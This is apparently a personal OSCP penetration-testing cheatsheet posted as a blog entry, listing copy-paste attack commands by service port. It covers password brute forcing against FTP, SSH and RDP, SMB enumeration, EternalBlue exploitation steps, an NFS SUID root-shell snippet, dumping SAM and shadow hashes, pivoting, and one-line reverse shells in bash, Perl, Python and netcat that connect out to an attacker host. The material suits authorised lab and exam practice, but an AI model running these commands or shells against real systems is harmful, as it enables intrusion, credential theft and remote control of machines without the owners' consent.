---
layout: post
title: OSCP personnal cheatsheet
tags: [OSCP, Cheatsheet]
description: "OSCP personnal cheatsheet"

---

- [Enumeration](#enumeration)
- [NMAP](#nmap)
  * [TCP](#tcp)
  * [UDP](#udp)
- [FTP - 21](#ftp---21)
  * [Brute force](#brute-force)
  * [Downloading file](#downloading-file)
  * [Uploading file](#uploading-file)
- [SSH - 22](#ssh---22)
  * [Brute force](#brute-force-1)
- [DNS - 53](#dns---53)
  * [Zone transfert](#zone-transfert)
  * [DNS brute force](#dns-brute-force)
- [SNMP - 161](#snmp---161)
  * [Brute force community string](#brute-force-community-string)
- [LDAP - 389](#ldap---389)
- [SMB - 445](#smb---445)
  * [Version if nmap didn't detect it](#version-if-nmap-didn-t-detect-it)
  * [Scans](#scans)
  * [Mount a SMB share](#mount-a-smb-share)
  * [EternalBlue](#eternalblue)
    + [Check if vulnerable](#check-if-vulnerable)
    + [Prepare shellcodes and listeners](#prepare-shellcodes-and-listeners)
    + [Exploit](#exploit)
  * [If this doesn't work, try this one](#if-this-doesn-t-work--try-this-one)
- [NFS - 2049](#nfs---2049)
  * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
  * [Mount a share](#mount-a-share)
  * [List NFS exported shares. If 'rw,no_root_squash' is present, connect, upload and execute suid-shell](#list-nfs-exported-shares-if--rw-no-root-squash--is-present--connect--upload-and-execute-suid-shell)
- [RDP - 3389](#rdp---3389)
  * [Connect with known credentials / hash](#connect-with-known-credentials---hash)
  * [Brute force](#brute-force-2)
  * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group--windows-)
- [DICTIONNARY GENERATION](#dictionnary-generation)
- [HASHES](#hashes)
  * [Windows](#windows)
  * [Linux](#linux)
- [PIVOTING](#pivoting)
  * [sshuttle](#sshuttle)
- [REVERSE SHELL](#reverse-shell)
  * [Bash](#bash)
  * [Perl](#perl)
  * [Python](#python)
  * [Netcat](#netcat)
  * [More reverse shell](#more-reverse-shell)

------

## Enumeration

```
nmap -sn -v <IP>/CIDR
```

```
nmapAutomator <IP> All
```

```
autorecon <IP>/CIDR
```

------

## NMAP

### TCP 

```
sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v
```

### UDP

```
sudo -sU -sS -sC -sV -oA <NAME>.udp <IP> -v
```

------

## FTP - 21

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

### Downloading file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

### Uploading file

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```

------

## SSH - 22

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

------

## DNS - 53

```
dnsenum <DOMAIN>
```

```
dnsrecon -d <DOMAIN>
```

### Zone transfert

```
dnsrecon -d <DOMAIN> -a
```

### DNS brute force

```
https://github.com/blark/aiodnsbrute
```

------

## SNMP - 161

### Brute force community string

```
onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```

```
snmp-check <IP>
```

------

## LDAP - 389

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <IP> -x -s base
```

------

## SMB - 445

### Version if nmap didn't detect it

```
Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.
```

### Scans

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP

nmap --script "safe or smb-enum-*" -p 445 <IP>
```

### Mount a SMB share

```
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```

### EternalBlue

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

#### Check if vulnerable

```
python eternal_checker.py <IP>
```

#### Prepare shellcodes and listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

#### Exploit

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin
```

### If this doesn't work, try this one

```
python zzz_exploit.py <IP>
```

------

## NFS - 2049

### Show Mountable NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

### Mount a share

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
```

### List NFS exported shares. If 'rw,no_root_squash' is present, connect, upload and execute suid-shell

```
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn
```

------

## RDP - 3389

### Connect with known credentials / hash

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
```

### Brute force

```
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP>
```

### Adding user to RDP group (Windows) 

```
net localgroup "Remote Desktop Users" <USER> /add
```

------

## DICTIONNARY GENERATION

```
cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
```

```
crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
```

------

## HASHES

### Windows

```
reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes
```

### Linux

```
unshadow passwd shadow > hashes
```

------

## PIVOTING

### sshuttle

```
sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
```

------

## REVERSE SHELL

### Bash

```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

### Perl

```
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### More reverse shell

```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
